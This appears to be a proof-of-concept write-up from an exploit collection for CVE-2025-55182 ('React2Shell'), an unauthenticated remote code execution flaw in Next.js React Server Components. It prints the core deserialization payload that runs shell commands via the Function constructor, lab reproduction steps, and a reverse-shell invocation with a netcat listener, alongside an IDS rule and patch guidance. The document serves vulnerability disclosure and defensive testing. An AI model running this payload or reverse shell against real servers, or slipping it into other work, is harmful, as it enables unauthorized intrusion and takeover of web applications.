# React2Shell - Next.js RSC Unauthenticated RCE

<!-- 
  File: 2026-05-17_react2shell-rce.md
  Location: pocs/web/
-->

---

## Metadata

| Field | Value |
|---|---|
| **Date Added** | 2026-05-17 |
| **Last Updated** | 2025-12-07 |
| **Author / Researcher** | zr0n (Luiz Fernando Ziron) |
| **CVE / Advisory** | CVE-2025-55182 |
| **Category** | web |
| **Severity** | Critical |
| **CVSS Score** | 10.0 (CVSSv3) |
| **Status** | Weaponized |
| **Tags** | RCE, Next.js, React, RSC, deserialization, prototype-pollution, unauthenticated, Node.js, cloud |
| **Related** | N/A |

---

## Affected Target

| Field | Value |
|---|---|
| **Software / System** | Next.js (App Router with React Server Components), React |
| **Versions Affected** | Next.js >=14.3.0-canary.77, all 15.x and 16.x with App Router; React 19.0, 19.1.0, 19.1.1, 19.2.0 |
| **Language / Platform** | JavaScript / Node.js |
| **Authentication Required** | No |
| **Network Access Required** | Yes |

---

## Summary

CVE-2025-55182 is a CVSS 10.0 unauthenticated Remote Code Execution vulnerability in Next.js applications using React Server Components (RSC) with the App Router. The exploit abuses unsafe deserialization of the RSC wire format: a crafted multipart POST request with a `next-action` header causes the server to deserialize a malicious payload that accesses the `Function` constructor via prototype chain traversal (`constructor.constructor`), injecting arbitrary JavaScript code into the server process. The vulnerability affects a large fraction of cloud-hosted Next.js applications and has been rapidly exploited by China-nexus threat actors Earth Lamia and Jackpot Panda.

---

## Vulnerability Details

### Root Cause

React Server Components use a custom serialization format for inter-component communication. The Next.js server deserializes multipart form data from requests bearing the `next-action` header without sufficient sanitization of object keys and values. An attacker can craft a payload where the `_formData.get` field is set to `'$3:constructor:constructor'`, which navigates the prototype chain to reach the JavaScript `Function` constructor. The `_prefix` field is then executed as arbitrary JavaScript code when the deserialized object is processed server-side.

### Attack Vector

Unauthenticated HTTP POST to any Next.js App Router endpoint (typically `/`) with the `next-action: x` header and a `multipart/form-data` body containing a crafted RSC wire format payload. No session, token, or prior interaction is required. The exploit framework (`react2shell.js`) supports multiple payload types including whoami, reverse shell, and file system operations.

### Impact

Unauthenticated Remote Code Execution as the Node.js process running the Next.js server. Attacker can read files, write files, execute system commands, and establish reverse shells. Affects approximately 39% of cloud environments running vulnerable Next.js versions.

---

## Environment / Lab Setup

```
OS:          Linux or Windows
Target:      Node.js 18+, Next.js 15.0.4 (vulnerable) with App Router
Attacker:    Any system with Node.js 18+
Tools:       Node.js, npm, form-data package
```

### Setup Steps

```bash
# Create vulnerable Next.js app
mkdir vulnerable-nextjs-app && cd vulnerable-nextjs-app
npx create-next-app@latest . --ts --app --no-eslint --tailwind
npm install next@15.0.4
npm run dev

# Install exploit dependencies
npm install form-data

# Run exploit
node react2shell.js http://localhost:3000 whoami
```

---

## Proof of Concept

### Step-by-Step Reproduction

1. **Spin up vulnerable target** - Start Next.js server on a vulnerable version
   ```bash
   npm install next@15.0.4 && npm run dev
   ```

2. **Run basic proof of concept** - Verify code execution via arithmetic
   ```bash
   node react2shell.js http://localhost:3000 basic
   # Server console should show: EXPLOITED: 50
   ```

3. **Escalate to reverse shell** - Set up listener and execute shell payload
   ```bash
   # Terminal 1
   nc -lvnp 4444
   # Terminal 2
   node react2shell.js http://localhost:3000 shell 10.10.10.5 4444
   ```

### Exploit Code

> See `react2shell.js` in this folder.

```javascript
// Core vulnerability chain
{
  _formData: { get: '$3:constructor:constructor' },  // Accesses Function constructor
  _prefix: 'console.log(require("child_process").execSync("id").toString())//'
}
// Delivered via multipart POST with 'next-action: x' header
```

### Expected Output

```
[*] Target: http://localhost:3000
[*] Payload: whoami
[*] Sending malicious request...
[+] Response status: 200
# Server console: www-data (or current Node.js process user)
```

---

## Screenshots / Evidence

<!-- Add paths to screenshots or embed them -->
- No screenshots included in upstream repo.

---

## Detection & Indicators of Compromise

```
# Nginx / Next.js access log signatures
POST / HTTP/1.1 with header: next-action
Content-Type: multipart/form-data
Body keys: 0, 1, 2, 3, 4 (numeric RSC wire format)
Body contains: constructor, _prefix, _formData
```

**SIEM / IDS Rule (example):**
```
alert http any any -> any any (msg:"CVE-2025-55182 React2Shell Next.js RCE Attempt"; content:"POST"; http_method; content:"next-action"; http_header; content:"constructor"; http_client_body; content:"_prefix"; http_client_body; sid:9000011;)
```

---

## Remediation

| Action | Detail |
|---|---|
| **Patch** | Upgrade Next.js to >=16.0.7, >=15.5.7, >=15.4.8, >=15.3.6, >=15.2.6, >=15.1.9, or >=15.0.5. Upgrade React to >=19.2.1 or >=19.1.2. |
| **Workaround** | Implement WAF rules blocking POST requests containing `next-action` header combined with `constructor` in the body; rate-limit RSC endpoints. |
| **Config Hardening** | Disable App Router Server Actions if not required; restrict which routes accept `next-action` requests via middleware. |

---

## References

- [CVE-2025-55182 (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2025-55182)
- [Next.js Security Advisories](https://github.com/vercel/next.js/security)
- [React Security Updates](https://react.dev/blog)
- [OWASP Code Injection](https://owasp.org/www-community/attacks/Code_Injection)
- [Source repo: https://github.com/zr0n/react2shell](https://github.com/zr0n/react2shell)

---

## Notes

CVSS 10.0 - maximum severity. Reportedly affects 39% of cloud environments at time of disclosure. Exploited by China-nexus groups Earth Lamia and Jackpot Panda shortly after public release. The exploit framework is a fully functional multi-payload Node.js tool supporting basic PoC, reconnaissance, file creation proof, visual proof (calc/notepad), and cross-platform (Windows PowerShell / Linux bash) reverse shells. Stars: 6, Forks: 4. Language: JavaScript.

Auto-ingested from https://github.com/zr0n/react2shell on 2026-05-17.
